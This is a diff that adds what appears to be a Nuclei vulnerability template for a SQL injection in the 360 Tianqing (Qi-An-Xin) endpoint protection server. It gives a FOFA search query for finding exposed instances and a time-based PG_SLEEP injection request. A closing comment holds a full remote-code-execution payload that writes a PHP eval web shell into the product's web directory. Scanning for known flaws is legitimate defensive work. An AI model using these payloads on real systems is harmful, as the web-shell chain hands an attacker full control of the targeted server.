@@ -1,0 +1,28 @@
+id: qianxin-360-tianqing-rptsvcsyncpoint-sqli
+
+info:
+  name: qianxin-360-tianqing-rptsvcsyncpoint-sqli
+  author: yy
+  severity: high
+  tags: qianxin,sqli
+  description: 360天擎官方版能够为用户精确检测已知病毒木马、未知恶意代码，有效防御APT攻击，360天擎存在SQL注入漏洞。
+  metadata: 
+    fofa-query: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        @timeout: 50s
+        GET /api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(3)-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:     
+      - type: dsl
+        name: mysql
+        dsl:
+          - "status_code_1 == 200 && duration>=3 && contains(body,'file_count') && contains(header,'application/json')" 
+          
+#rce：/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--  
+#1.php        
